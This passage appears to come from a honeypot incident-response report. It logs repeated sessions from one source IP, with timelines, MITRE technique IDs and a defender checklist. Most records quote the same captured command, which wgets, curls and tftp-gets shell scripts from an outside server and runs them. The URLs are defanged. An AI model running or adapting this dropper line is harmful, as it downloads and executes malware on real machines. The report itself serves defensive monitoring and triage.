| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:51` | `cowrie.session.connect` |
| `2026-08-25 09:57:51` | `cowrie.login.success` |
| `2026-08-25 09:57:52` | `cowrie.session.params` |
| `2026-08-25 09:57:52` | `cowrie.command.input` |
| `2026-08-25 09:57:52` | `cowrie.command.success` |
| `2026-08-25 09:57:52` | `cowrie.session.file_download` |
| `2026-08-25 09:57:53` | `cowrie.log.closed` |
| `2026-08-25 09:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-990a45f50545

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:53` | `cowrie.session.connect` |
| `2026-08-25 09:57:53` | `cowrie.login.success` |
| `2026-08-25 09:57:54` | `cowrie.session.params` |
| `2026-08-25 09:57:54` | `cowrie.command.input` |
| `2026-08-25 09:57:54` | `cowrie.command.success` |
| `2026-08-25 09:57:54` | `cowrie.session.file_download` |
| `2026-08-25 09:57:54` | `cowrie.log.closed` |
| `2026-08-25 09:57:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f164593df49

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:54` | `cowrie.session.connect` |
| `2026-08-25 09:57:55` | `cowrie.login.success` |
| `2026-08-25 09:57:55` | `cowrie.session.params` |
| `2026-08-25 09:57:55` | `cowrie.command.input` |
| `2026-08-25 09:57:55` | `cowrie.command.success` |
| `2026-08-25 09:57:56` | `cowrie.log.closed` |
| `2026-08-25 09:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-042309d4e399

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:56` | `cowrie.session.connect` |
| `2026-08-25 09:57:56` | `cowrie.login.success` |
| `2026-08-25 09:57:57` | `cowrie.session.params` |
| `2026-08-25 09:57:57` | `cowrie.command.input` |
| `2026-08-25 09:57:57` | `cowrie.command.success` |
| `2026-08-25 09:57:57` | `cowrie.log.closed` |
| `2026-08-25 09:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34622217f973

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:57` | `cowrie.session.connect` |
| `2026-08-25 09:57:58` | `cowrie.login.success` |
| `2026-08-25 09:57:58` | `cowrie.session.params` |
| `2026-08-25 09:57:58` | `cowrie.command.input` |
| `2026-08-25 09:57:58` | `cowrie.command.success` |
| `2026-08-25 09:57:59` | `cowrie.log.closed` |
| `2026-08-25 09:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f443c424a33f

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:57 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:57:59` | `cowrie.session.connect` |
| `2026-08-25 09:57:59` | `cowrie.login.success` |
| `2026-08-25 09:58:00` | `cowrie.session.params` |
| `2026-08-25 09:58:00` | `cowrie.command.input` |
| `2026-08-25 09:58:00` | `cowrie.command.success` |
| `2026-08-25 09:58:00` | `cowrie.log.closed` |
| `2026-08-25 09:58:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6afd6c12b4b8

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:00` | `cowrie.session.connect` |
| `2026-08-25 09:58:00` | `cowrie.login.success` |
| `2026-08-25 09:58:01` | `cowrie.session.params` |
| `2026-08-25 09:58:01` | `cowrie.command.input` |
| `2026-08-25 09:58:01` | `cowrie.command.success` |
| `2026-08-25 09:58:02` | `cowrie.log.closed` |
| `2026-08-25 09:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a89932e0f468

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:02` | `cowrie.session.connect` |
| `2026-08-25 09:58:02` | `cowrie.login.success` |
| `2026-08-25 09:58:03` | `cowrie.session.params` |
| `2026-08-25 09:58:03` | `cowrie.command.input` |
| `2026-08-25 09:58:03` | `cowrie.command.success` |
| `2026-08-25 09:58:03` | `cowrie.log.closed` |
| `2026-08-25 09:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65a88b7d77cb

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:03` | `cowrie.session.connect` |
| `2026-08-25 09:58:03` | `cowrie.login.success` |
| `2026-08-25 09:58:04` | `cowrie.session.params` |
| `2026-08-25 09:58:04` | `cowrie.command.input` |
| `2026-08-25 09:58:04` | `cowrie.command.success` |
| `2026-08-25 09:58:05` | `cowrie.log.closed` |
| `2026-08-25 09:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f0cff4f3b8b

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:05` | `cowrie.session.connect` |
| `2026-08-25 09:58:05` | `cowrie.login.success` |
| `2026-08-25 09:58:06` | `cowrie.session.params` |
| `2026-08-25 09:58:06` | `cowrie.log.closed` |
| `2026-08-25 09:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97cc5ed6be99

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:06` | `cowrie.session.connect` |
| `2026-08-25 09:58:06` | `cowrie.login.success` |
| `2026-08-25 09:58:07` | `cowrie.session.params` |
| `2026-08-25 09:58:07` | `cowrie.command.input` |
| `2026-08-25 09:58:07` | `cowrie.command.success` |
| `2026-08-25 09:58:07` | `cowrie.log.closed` |
| `2026-08-25 09:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2ee9136eb9c

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:08` | `cowrie.session.connect` |
| `2026-08-25 09:58:08` | `cowrie.login.success` |
| `2026-08-25 09:58:08` | `cowrie.session.params` |
| `2026-08-25 09:58:08` | `cowrie.command.input` |
| `2026-08-25 09:58:08` | `cowrie.command.success` |
| `2026-08-25 09:58:09` | `cowrie.log.closed` |
| `2026-08-25 09:58:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac543361ebcc

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:09` | `cowrie.session.connect` |
| `2026-08-25 09:58:09` | `cowrie.login.success` |
| `2026-08-25 09:58:10` | `cowrie.session.params` |
| `2026-08-25 09:58:10` | `cowrie.command.input` |
| `2026-08-25 09:58:10` | `cowrie.command.success` |
| `2026-08-25 09:58:10` | `cowrie.log.closed` |
| `2026-08-25 09:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28f3d67b089a

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:11` | `cowrie.session.connect` |
| `2026-08-25 09:58:11` | `cowrie.login.success` |
| `2026-08-25 09:58:11` | `cowrie.session.params` |
| `2026-08-25 09:58:11` | `cowrie.command.input` |
| `2026-08-25 09:58:11` | `cowrie.command.success` |
| `2026-08-25 09:58:12` | `cowrie.log.closed` |
| `2026-08-25 09:58:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ef11e1a06b2

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:12` | `cowrie.session.connect` |
| `2026-08-25 09:58:12` | `cowrie.login.success` |
| `2026-08-25 09:58:13` | `cowrie.session.params` |
| `2026-08-25 09:58:13` | `cowrie.command.input` |
| `2026-08-25 09:58:13` | `cowrie.command.success` |
| `2026-08-25 09:58:14` | `cowrie.log.closed` |
| `2026-08-25 09:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed5259e3440c

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:14` | `cowrie.session.connect` |
| `2026-08-25 09:58:14` | `cowrie.login.success` |
| `2026-08-25 09:58:14` | `cowrie.session.params` |
| `2026-08-25 09:58:15` | `cowrie.command.input` |
| `2026-08-25 09:58:15` | `cowrie.command.success` |
| `2026-08-25 09:58:15` | `cowrie.log.closed` |
| `2026-08-25 09:58:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8176a62bdc02

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:15` | `cowrie.session.connect` |
| `2026-08-25 09:58:15` | `cowrie.login.success` |
| `2026-08-25 09:58:16` | `cowrie.session.params` |
| `2026-08-25 09:58:16` | `cowrie.command.input` |
| `2026-08-25 09:58:16` | `cowrie.command.success` |
| `2026-08-25 09:58:17` | `cowrie.log.closed` |
| `2026-08-25 09:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d60ccd8ef1ce

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:17` | `cowrie.session.connect` |
| `2026-08-25 09:58:17` | `cowrie.login.success` |
| `2026-08-25 09:58:17` | `cowrie.session.params` |
| `2026-08-25 09:58:18` | `cowrie.command.input` |
